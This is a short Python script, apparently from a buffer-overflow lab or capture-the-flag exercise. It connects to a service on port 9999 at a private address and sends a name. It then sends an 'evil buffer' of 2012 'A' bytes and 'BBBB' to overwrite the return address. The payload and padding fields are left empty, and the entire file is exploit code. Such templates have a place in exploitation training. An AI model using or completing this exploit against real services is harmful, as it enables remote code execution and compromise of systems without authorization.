#!/usr/bin/env python3

import socket

ip = "172.16.0.4"
port = 9999

name = "My Name"
offset = 2012
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  get = s.recv(1024)
  print(get)
  get = s.recv(1024)
  print(get)
  print("Sending name...")
  s.send(bytes(name + "\r\n", "latin-1"))
  get = s.recv(1024)
  print(get)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.close()
  print("Done!")
except:
  print("Could not connect.")